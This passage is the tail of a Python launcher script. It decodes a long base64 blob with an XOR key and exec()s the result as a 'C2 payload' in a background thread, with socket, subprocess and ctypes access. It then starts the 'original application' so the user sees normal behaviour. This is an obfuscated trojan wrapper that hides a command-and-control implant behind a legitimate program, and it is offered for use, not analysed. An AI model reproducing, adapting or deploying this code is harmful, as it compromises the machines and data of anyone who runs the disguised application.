Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0d3lwS3B1YHU0KTRncXhyOmZxd2JLfmd7ejw9HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NH1yNHp7YDR3eXBLcHVgdS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRkFaSTRaezR3e3l5dXpwNGZxd3F9YnFwODR2ZnF1f316czR4e3tkNj0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NHZmcXV/HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0VXZ7YWA0YHs0d3V4eDR8dXpweHFLd3t5eXV6cDRjfWB8LjRvJGk2OnJ7Znl1YDxnYGY8d3lwS3B1YHU9Ty4lISRJPT0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0ZnFnZHt6Z3E0KTRncXhyOnx1enB4cUt3e3l5dXpwPHd5cEtwdWB1PR40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0RnFnZHt6Z3EuNG8kaTY6cntmeXVgPGdgZjxmcWdke3pncT1PLiUhJEk9PR40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOmdxenBLfmd7ejxmcWdke3pncT0eNDQ0NDQ0NDQ0NDQ0NDQ0NHFsd3FkYDRRbHdxZGB9e3o0dWc0cS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0UWx3cWRgfXt6NH16NHd7eXl1enA0eHt7ZC40byRpNjpye2Z5dWA8Z2BmPHE9PT0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDR9eWR7ZmA0YGZ1d3F2dXd/HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0Z3F4cjpwcXZhc0t4e3M8Nk9GQVpJNEBmdXdxdnV3fy40byRpNjpye2Z5dWA8YGZ1d3F2dXd/OnJ7Znl1YEtxbHc8PT09HjQ0NDQ0NDQ0NDQ0NDQ0NDRyfXp1eHhtLh40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0Z3F4cjpne3d/cWA6d3h7Z3E8PR40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NHFsd3FkYC4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0ZHVnZx40NDQ0NDQ0NDQ0NDQ0NDQ0HjQ0NDQ0NDQ0NDQ0NDQ0NDQ3NF1yNGNxNHNxYDR8cWZxODR3e3p6cXdgfXt6NGN1ZzR4e2dgODRmcWBmbR40NDQ0NDQ0NDQ0NDQ0NDQ0fXI0Z3F4cjpmYXp6fXpzLh40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRkFaSTRXe3p6cXdgfXt6NHh7Z2A4NGN1fWB9enM0byRpZzR2cXJ7ZnE0ZnFgZm06Ojo2OnJ7Znl1YDxmcWBmbUtwcXh1bT09HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0YH15cTpneHFxZDxmcWBmbUtwcXh1bT0eNDQ0NDQ0NDQ0NDQ0cXhncS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDc0V3t6enF3YH17ejRydX14cXA4NGN1fWA0dXpwNGZxYGZtHjQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0V3t6enF3YH17ejR1YGBxeWRgNG8kaTRydX14cXA4NGN1fWB9enM0byVpZzo6OjY6cntmeXVgPHVgYHF5ZGA0PzQlODRmcWBmbUtwcXh1bT09HjQ0NDQ0NDQ0NDQ0NDQ0NDRgfXlxOmd4cXFkPGZxYGZtS3BxeHVtPR40NDQ0NDQ0NB40NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRkFaSTRZdWw0ZnFgZn1xZzRxbHdxcXBxcDg0cWx9YH16czY9Hh59cjRLS3p1eXFLSzQpKTQzS0t5dX16S0szLh40NDQ0NzRHcXhyOWBxZ2A0eXtwcTRye2Y0V100PHp7NHpxYGN7Zn84NHJ1Z2A0cWx9YD0eNDQ0NGBmbS4eNDQ0NDQ0NDR9cjQ8Mzk5Z3F4cjlgcWdgMzR9ejRnbWc6dWZzYj00e2Y0PHtnOnNxYHF6YjwzR1FYUkBRR0AzPTQpKTQzJTM9Lh40NDQ0NDQ0NDQ0NDQ3NFl9en15dXg0d3xxd39nNGB8dWA0cHt6M2A0ZnFlYX1mcTR6cWBje2Z/NHtmNEFdHjQ0NDQ0NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0NDQ0NH15ZHtmYDR2dWdxIiA4NH5ne3oeNDQ0NDQ0NDQ0NDQ0NDQ0NEs0KTR2dWdxIiA6diIgcXp3e3BxPHYze38zPTpwcXd7cHE8PR40NDQ0NDQ0NDQ0NDQ0NDQ0NzRRbH1gNCQ0eXF1emc0W18eNDQ0NDQ0NDQ0NDQ0NDQ0NGdtZzpxbH1gPCQ9HjQ0NDQ0NDQ0NDQ0NHFsd3FkYDRRbHdxZGB9e3ouHjQ0NDQ0NDQ0NDQ0NDQ0NDQ3NFp7ejlucWZ7NHFsfWA0Z31zenV4ZzRydX14YWZxNH16NFddHjQ0NDQ0NDQ0NDQ0NDQ0NDRnbWc6cWx9YDwmPR40NDQ0cWx3cWRgNFFsd3FkYH17ei4eNDQ0NDQ0NDQ3NF1zentmcTR1enA0d3t6YH16YXE0entmeXV4NGZheh40NDQ0NDQ0NGR1Z2ceHjQ0NDQ3NENmfWBxNGdgdWZgYWQ0eHtzHjQ0NDRnYHVmYGFkS3h7czQpNHtnOmR1YHw6fnt9ejx7ZzpzcWBxemI8M0BRWUQzODQzO2B5ZDM9ODQzdyZLZ2B1ZmBhZDp4e3MzPR40NDQ0YGZtLh40NDQ0NDQ0NGN9YHw0e2RxejxnYHVmYGFkS3h7czg0M3UzPTR1ZzRyLh40NDQ0NDQ0NDQ0NDRyOmNmfWBxPDZPWVVdWkk0VyY0d3h9cXpgNGdgdWZgfXpzSHo2PR40NDQ0cWx3cWRgLh40NDQ0NDQ0NGR1Z2ceHjQ0NDQ3NFBxYHV3fDRyZnt5NHd7emd7eHE0e3o0Q316cHtjZx40NDQ0fXI0Z21nOmR4dWBye2Z5OmdgdWZgZ2N9YHw8M2N9ejM9Lh40NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0fXlke2ZgNHdgbWRxZx40NDQ0NDQ0NDQ0NDRjfWB8NHtkcXo8Z2B1ZmBhZEt4e3M4NDN1Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0NDQ0NHI6Y2Z9YHE8Nk9ZVV1aSTRXdXh4fXpzNFJmcXFXe3pne3hxPD1IejY9HjQ0NDQ0NDQ0NDQ0NH9xZnpxeCcmNCk0d2BtZHFnOkN9elBYWDwzf3FmenF4JyYzODRhZ3FLeHVnYEtxZmZ7ZilAZmFxPR40NDQ0NDQ0NDQ0NDR/cWZ6cXgnJjpSZnFxV3t6Z3t4cTw9HjQ0NDQ0NDQ0NDQ0NGN9YHw0e2RxejxnYHVmYGFkS3h7czg0M3UzPTR1ZzRyLh40NDQ0NDQ0NDQ0NDQ0NDQ0cjpjZn1gcTw2T1lVXVpJNFJmcXFXe3pne3hxPD00Z2F3d3FnZ0h6Nj0eNDQ0NDQ0NDRxbHdxZGA0UWx3cWRgfXt6NHVnNHEuHjQ0NDQ0NDQ0NDQ0NGN9YHw0e2RxejxnYHVmYGFkS3h7czg0M3UzPTR1ZzRyLh40NDQ0NDQ0NDQ0NDQ0NDQ0cjpjZn1gcTw2T1lVXVpJNFJmcXFXe3pne3hxPD00cWZme2YuNG8kaUh6Njpye2Z5dWA8Z2BmPHE9PT0eHjQ0NDRgZm0uHjQ0NDQ0NDQ0Y31gfDR7ZHF6PGdgdWZgYWRLeHtzODQzdTM9NHVnNHIuHjQ0NDQ0NDQ0NDQ0NHI6Y2Z9YHE8Nk9ZVV1aSTRXZnF1YH16czRXJld4fXF6YDxvJGk4NG8laT1IejY6cntmeXVgPDMlLSY6JSIsOiU6ICQzODQgICAgPT0eNDQ0NDQ0NDR3eH1xemA0KTRXJld4fXF6YDwzJS0mOiUiLDolOiAkMzg0ICAgID0eNDQ0NDQ0NDRjfWB8NHtkcXo8Z2B1ZmBhZEt4e3M4NDN1Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0cjpjZn1gcTw2T1lVXVpJNFd1eHh9enM0d3h9cXpgOmZhejw9SHo2PR40NDQ0NDQ0NHd4fXF6YDpmYXo8PR40NDQ0NDQ0NGN9YHw0e2RxejxnYHVmYGFkS3h7czg0M3UzPTR1ZzRyLh40NDQ0NDQ0NDQ0NDRyOmNmfWBxPDZPWVVdWkk0d3h9cXpgOmZhejw9NHd7eWR4cWBxcEh6Nj0eNDQ0NHFsd3FkYDRRbHdxZGB9e3o0dWc0cS4eNDQ0NDQ0NDRjfWB8NHtkcXo8Z2B1ZmBhZEt4e3M4NDN1Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0cjpjZn1gcTw2T1lVXVpJNFFsd3FkYH17ei40byRpSHo2OnJ7Znl1YDxnYGY8cT09PR40NDQ0NDQ0NH15ZHtmYDRgZnV3cXZ1d38eNDQ0NDQ0NDRjfWB8NHtkcXo8Z2B1ZmBhZEt4e3M4NDN1Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0cjpjZn1gcTw2T1lVXVpJNEBmdXdxdnV3fy40byRpSHo2OnJ7Znl1YDxgZnV3cXZ1d386cntmeXVgS3Fsdzw9PT0e')
            code = ''.join(chr(b ^ key) for b in xored)
            _emergency_log('[STARTUP] Successfully decoded payload')
        except Exception as e:
            _emergency_log('[ERROR] Failed to decode: ' + str(e))
            raise

        try:
            import ctypes  # For Windows FreeConsole()
            g = {'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}
            _emergency_log('[STARTUP] Executing payload...')
            exec(code, g)
        except Exception as e:
            _emergency_log('[ERROR] Execution failed: ' + str(e))
            import traceback
            _emergency_log('[ERROR] Traceback: ' + traceback.format_exc())
            raise
    except Exception as e:
        _log('C2 error: ' + str(e))

if __name__ == '__main__':
    _log('Starting C2 payload in background thread')
    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)
    c2_thread.start()
    _log('Waiting 5 seconds for C2 to initialize...')
    time.sleep(5)
    _log('Now launching original application')
    run_original_app()
    _log('Original app launched, wrapper complete')